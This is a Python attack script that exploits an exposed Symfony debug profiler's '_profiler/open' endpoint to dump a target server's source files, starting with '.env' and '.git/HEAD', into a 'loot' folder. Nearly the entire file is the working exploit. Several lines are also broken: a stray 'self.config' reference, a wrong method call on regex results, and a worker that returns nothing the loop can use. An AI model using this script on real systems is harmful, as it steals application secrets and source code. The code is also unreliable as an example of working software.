#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : SymfonyDumpSource.py
# Author             : Podalirius (@podalirius_)
# Date created       : 27 Sep 2023

import argparse
import re
import requests
# Disable warnings of insecure connection for invalid certificates
requests.packages.urllib3.disable_warnings()
# Allow use of deprecated and weak cipher methods
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
try:
    requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
except AttributeError:
    pass
from concurrent.futures import ThreadPoolExecutor
import os
from bs4 import BeautifulSoup
import urllib.parse


VERSION = "1.1"


def filesize_to_str(filecontent):
    l = len(filecontent)
    units = ['B', 'kB', 'MB', 'GB', 'TB', 'PB']
    for k in range(len(units)):
        if l < (1024 ** (k + 1)):
            break
    return "%4.2f %s" % (round(l / (1024 ** k), 2), units[k])


def extract_links(url):
    r = requests.get(url)
    soup = BeautifulSoup(r.content, "html.parser")
    files = []
    for link in soup.find_all("a", href=True):
        link = link["href"]
        if "/_profiler/open" in link:
            if "file=" in link:
                filename = link.split("file=")[1]
                if "&" in filename:
                    filename = filename.split("&")[0]
                files.append(filename)
    files = sorted(list(set(files)))
    return files


def worker_dump_source(target, path_to_file, options):
    r = requests.get(
        url=f"{target}/_profiler/open?file={path_to_file}&line=0"
    )

    soup = BeautifulSoup(r.content, "lxml")
    div_source = soup.find("div", attrs={"class": "source"})
    if div_source is not None:
        file_content = div_source.text.strip().replace("", "\xa0")
        print("\x1b[92m[+] (%9s) %s\x1b[0m" % (filesize_to_str(file_content), path_to_file))

        basepath = os.path.join(options.dump_dir, os.path.dirname(path_to_file))
        filename = os.path.basename(path_to_file)
        if basepath not in [".", ""]:
            if not os.path.exists(basepath):
                os.makedirs(basepath)
            path_to_file = basepath + os.path.sep + filename
        else:
            path_to_file = filename

        f = open(path_to_file, "w")
        f.write(file_content + "\n")
        f.close()

        matched = re.findall(r"(['\"])([^'\"]+)\1", file_content)
        if matched is not None:
            for group in matched:
                print(group.groups(0))

    else:
        if options.verbose:
            print("\x1b[91m[!] (%s) %s\x1b[0m" % ("==error==", path_to_file))
        return None


def parseArgs():
    print("SymfonyDumpSource.py v%s - by @podalirius_\n" % VERSION)

    parser = argparse.ArgumentParser(description="")

    parser.add_argument("-v", "--verbose", default=False, action="store_true", help='Verbose mode. (default: False)')
    parser.add_argument("--debug", dest="debug", action="store_true", default=False, help="Debug mode.")
    parser.add_argument("--no-colors", dest="no_colors", action="store_true", default=False, help="No colors mode.")

    parser.add_argument("-t", "--target", dest="target", required=True, help="Target symfony instance.")

    parser.add_argument("-D", "--dump-dir", dest="dump_dir", type=str, default="./loot/", required=False, help="Directory where the dumped files will be stored.")
    parser.add_argument("-f", "--file-list", dest="file_list", type=str, default=None, required=False, help="File containing symfony paths.")

    parser.add_argument("-T", "--threads", dest="threads", action="store", type=int, default=5, required=False, help="Number of threads (default: 5)")

    return parser.parse_args()


if __name__ == '__main__':
    options = parseArgs()

    if not options.target.startswith("http://") and not options.target.startswith("https://"):
        options.target = "http://" + options.target

    local_files = [
        ".env",
        ".git/HEAD"
    ]

    # Automatically extract file paths from debug page
    r = requests.get(options.target)
    if "X-Debug-Token-Link" in r.headers.keys():
        panels = [
            "request", "time", "validator", "form", "exception", "logger", "events", "router",
            "cache", "translation", "security", "twig", "http_client", "db", "mailer", "config"
        ]
        for panel in panels:
            local_files += extract_links(r.headers["X-Debug-Token-Link"] + "?panel=" + panel)

    # Load custom list of files to dump from file
    if options.file_list is not None:
        if os.path.exists(options.file_list):
            f = open(options.file_list, "r")
            local_files += sorted(list(set([l.strip() for l in f.readlines()])))
            f.close()

    while len(local_files) != 0:
        new_files = []

        with ThreadPoolExecutor(max_workers=min(options.threads, len(local_files))) as tp:
            tasks = [tp.submit(worker_dump_source, options.target, file, options) for file in local_files]

        # Get results
        for t in tasks:
            if t._result:
                new_files += t._result
                self.config.known_links += t._result
        local_files = new_files[:]

    print("\n[+] Bye Bye!")
